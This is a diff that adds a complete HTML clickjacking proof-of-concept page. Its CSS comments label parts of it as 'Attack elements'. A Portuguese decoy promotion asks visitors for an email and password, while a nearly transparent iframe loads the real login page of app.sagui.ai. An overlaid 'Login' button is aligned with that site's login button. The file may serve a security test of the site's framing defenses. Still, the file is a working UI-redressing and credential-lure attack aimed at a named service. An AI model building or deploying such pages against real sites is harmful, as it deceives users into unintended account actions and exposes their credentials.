@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Member Offer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        
+        .decoy-container {
+            width: 400px;
+            margin: 50px auto;
+            padding: 30px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: relative;
+        }
+        
+        h1 {
+            color: #2c3e50;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        p {
+            color: #7f8c8d;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .decoy-form {
+            margin-top: 20px;
+        }
+        
+        .decoy-input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        
+        .decoy-footer {
+            text-align: right;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #7f8c8d;
+        }
+        
+        /* Attack elements */
+        .attack-iframe {
+            position: absolute;
+            top: 180px; /* Adjust based on your decoy content */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 400px;
+            height: 300px;
+            opacity: 0.1; /* Nearly transparent for demonstration */
+            z-index: 1;
+            border: none;
+        }
+        
+        .attack-button {
+            position: absolute;
+            top: 355px; /* Position over the login button */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 370px; /* Match login button width */
+            height: 45px; /* Match login button height */
+            opacity: 1;
+            cursor: pointer;
+            z-index: 2;
+        }
+    </style>
+</head>
+<body>
+    <div class="decoy-container">
+        <h1>Assinatura Sagui AI</h1>
+        <p>Coloque seus dados para adentrar a promocao limitada!!</p>
+        
+        <div class="decoy-form">
+            <input type="text" class="decoy-input" placeholder="Email">
+            <input type="password" class="decoy-input" placeholder="Senha">
+        </div>
+        
+        <div class="decoy-footer">
+            <a href="#">Esqueceu a senha?</a>
+        </div>
+        
+        <!-- Transparent button aligned with the real login button -->
+        <button class="attack-button">Login</button>
+        
+        <!-- Hidden iframe loading the target login page -->
+        <iframe src="https://app.sagui.ai/" class="attack-iframe"></iframe>
+    </div>
+</body>
+</html>
